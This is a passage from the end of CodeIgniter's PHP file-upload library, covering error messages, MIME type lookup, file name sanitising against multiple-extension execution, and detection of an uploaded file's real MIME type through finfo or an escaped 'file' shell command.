		return $CI->security->xss_clean($data, TRUE);
	}

	// --------------------------------------------------------------------

	/**
	 * Set an error message
	 *
	 * @param	string
	 * @return	void
	 */
	public function set_error($msg)
	{
		$CI =& get_instance();
		$CI->lang->load('upload');

		if (is_array($msg))
		{
			foreach ($msg as $val)
			{
				$msg = ($CI->lang->line($val) == FALSE) ? $val : $CI->lang->line($val);
				$this->error_msg[] = $msg;
				log_message('error', $msg);
			}
		}
		else
		{
			$msg = ($CI->lang->line($msg) == FALSE) ? $msg : $CI->lang->line($msg);
			$this->error_msg[] = $msg;
			log_message('error', $msg);
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Display the error message
	 *
	 * @param	string
	 * @param	string
	 * @return	string
	 */
	public function display_errors($open = '<p>', $close = '</p>')
	{
		$str = '';
		foreach ($this->error_msg as $val)
		{
			$str .= $open.$val.$close;
		}

		return $str;
	}

	// --------------------------------------------------------------------

	/**
	 * List of Mime Types
	 *
	 * This is a list of mime types.  We use it to validate
	 * the "allowed types" set by the developer
	 *
	 * @param	string
	 * @return	string
	 */
	public function mimes_types($mime)
	{
		global $mimes;

		if (count($this->mimes) == 0)
		{
			if (defined('ENVIRONMENT') AND is_file(APPPATH.'config/'.ENVIRONMENT.'/mimes.php'))
			{
				include(APPPATH.'config/'.ENVIRONMENT.'/mimes.php');
			}
			elseif (is_file(APPPATH.'config/mimes.php'))
			{
				include(APPPATH.'config//mimes.php');
			}
			else
			{
				return FALSE;
			}

			$this->mimes = $mimes;
			unset($mimes);
		}

		return ( ! isset($this->mimes[$mime])) ? FALSE : $this->mimes[$mime];
	}

	// --------------------------------------------------------------------

	/**
	 * Prep Filename
	 *
	 * Prevents possible script execution from Apache's handling of files multiple extensions
	 * http://httpd.apache.org/docs/1.3/mod/mod_mime.html#multipleext
	 *
	 * @param	string
	 * @return	string
	 */
	protected function _prep_filename($filename)
	{
		if (strpos($filename, '.') === FALSE OR $this->allowed_types == '*')
		{
			return $filename;
		}

		$parts		= explode('.', $filename);
		$ext		= array_pop($parts);
		$filename	= array_shift($parts);

		foreach ($parts as $part)
		{
			if ( ! in_array(strtolower($part), $this->allowed_types) OR $this->mimes_types(strtolower($part)) === FALSE)
			{
				$filename .= '.'.$part.'_';
			}
			else
			{
				$filename .= '.'.$part;
			}
		}

		$filename .= '.'.$ext;

		return $filename;
	}

	// --------------------------------------------------------------------

	/**
	 * File MIME type
	 *
	 * Detects the (actual) MIME type of the uploaded file, if possible.
	 * The input array is expected to be $_FILES[$field]
	 *
	 * @param	array
	 * @return	void
	 */
	protected function _file_mime_type($file)
	{
		// We'll need this to validate the MIME info string (e.g. text/plain; charset=us-ascii)
		$regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';

		/* Fileinfo extension - most reliable method
		 *
		 * Unfortunately, prior to PHP 5.3 - it's only available as a PECL extension and the
		 * more convenient FILEINFO_MIME_TYPE flag doesn't exist.
		 */
		if (function_exists('finfo_file'))
		{
			$finfo = finfo_open(FILEINFO_MIME);
			if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
			{
				$mime = @finfo_file($finfo, $file['tmp_name']);
				finfo_close($finfo);

				/* According to the comments section of the PHP manual page,
				 * it is possible that this function returns an empty string
				 * for some files (e.g. if they don't exist in the magic MIME database)
				 */
				if (is_string($mime) && preg_match($regexp, $mime, $matches))
				{
					$this->file_type = $matches[1];
					return;
				}
			}
		}

		/* This is an ugly hack, but UNIX-type systems provide a "native" way to detect the file type,
		 * which is still more secure than depending on the value of $_FILES[$field]['type'], and as it
		 * was reported in issue #750 (https://github.com/bcit-ci/CodeIgniter/issues/750) - it's better
		 * than mime_content_type() as well, hence the attempts to try calling the command line with
		 * three different functions.
		 *
		 * Notes:
		 *	- the DIRECTORY_SEPARATOR comparison ensures that we're not on a Windows system
		 *	- many system admins would disable the exec(), shell_exec(), popen() and similar functions
		 *	  due to security concerns, hence the function_exists() checks
		 */
		if (DIRECTORY_SEPARATOR !== '\\')
		{
			$cmd = 'file --brief --mime ' . escapeshellarg($file['tmp_name']) . ' 2>&1';

			if (function_exists('exec'))
			{
				/* This might look confusing, as $mime is being populated with all of the output when set in the second parameter.
				 * However, we only neeed the last line, which is the actual return value of exec(), and as such - it overwrites
				 * anything that could already be set for $mime previously. This effectively makes the second parameter a dummy
				 * value, which is only put to allow us to get the return status code.
				 */
				$mime = @exec($cmd, $mime, $return_status);
				if ($return_status === 0 && is_string($mime) && preg_match($regexp, $mime, $matches))
				{
					$this->file_type = $matches[1];
					return;
				}
			}

			if ( (bool) @ini_get('safe_mode') === FALSE && function_exists('shell_exec'))
			{
				$mime = @shell_exec($cmd);
				if (strlen($mime) > 0)
				{
					$mime = explode("\n", trim($mime));
					if (preg_match($regexp, $mime[(count($mime) - 1)], $matches))
					{
						$this->file_type = $matches[1];
						return;
					}
				}
			}

			if (function_exists('popen'))
			{
				$proc = @popen($cmd, 'r');
				if (is_resource($proc))
				{
					$mime = @fread($proc, 512);
					@pclose($proc);
					if ($mime !== FALSE)
					{
						$mime = explode("\n", trim($mime));
						if (preg_match($regexp, $mime[(count($mime) - 1)], $matches))
						{
							$this->file_type = $matches[1];
							return;
						}
					}
				}
			}
		}

		// Fall back to the deprecated mime_content_type(), if available (still better than $_FILES[$field]['type'])
		if (function_exists('mime_content_type'))
		{
			$this->file_type = @mime_content_type($file['tmp_name']);
			if (strlen($this->file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
			{
				return;
			}
		}

		$this->file_type = $file['type'];
	}

	// --------------------------------------------------------------------

}
// END Upload Class

/* End of file Upload.php */
/* Location: ./system/libraries/Upload.php */
